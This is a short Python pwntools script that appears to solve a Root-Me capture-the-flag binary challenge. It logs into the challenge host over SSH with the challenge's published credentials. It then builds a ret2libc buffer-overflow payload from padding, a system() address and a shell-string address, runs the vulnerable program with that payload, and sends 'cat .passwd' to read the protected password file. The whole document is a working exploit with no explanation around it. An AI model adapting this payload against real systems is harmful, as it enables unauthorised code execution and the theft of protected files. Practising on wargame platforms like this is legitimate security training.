from pwn import *
pwn_socket=ssh(host='challenge02.root-me.org' ,user='app-systeme-ch33' ,password='app-systeme-ch33',port=2222)

padd = 'A'*32
syscall = p32(0xb7e62310) 
exit = 'B'*4
arg = p32(0xb7f84cec)
payload = padd + syscall + exit + arg
sh = pwn_socket.process(argv = ['./ch33', payload])
sh.sendline('cat .passwd')
print sh.recv()
print sh.recv()
